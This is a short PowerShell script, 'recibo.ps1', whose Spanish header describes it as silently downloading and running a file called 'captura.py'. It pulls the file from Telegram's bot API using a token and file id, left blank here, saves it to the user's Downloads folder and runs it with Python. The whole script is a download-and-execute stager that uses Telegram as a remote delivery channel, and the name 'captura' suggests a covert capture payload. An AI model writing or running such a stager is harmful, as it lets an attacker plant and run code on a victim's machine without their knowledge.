# ============================================================
# recibo.ps1 - Descarga y ejecuta captura.py (silencioso)
# ============================================================

$token = ""
$file_id = ""
$destino = "$env:USERPROFILE\Downloads\captura.py"

$u = "https://api.telegram.org/bot$token/getFile?file_id=$file_id"
$r = Invoke-WebRequest -UseBasicParsing -Uri $u
$json = $r.Content | ConvertFrom-Json
$downloadUrl = "https://api.telegram.org/file/bot$token/$($json.result.file_path)"
(New-Object Net.WebClient).DownloadFile($downloadUrl, $destino)

if (Test-Path $destino) {
    python "$destino"
}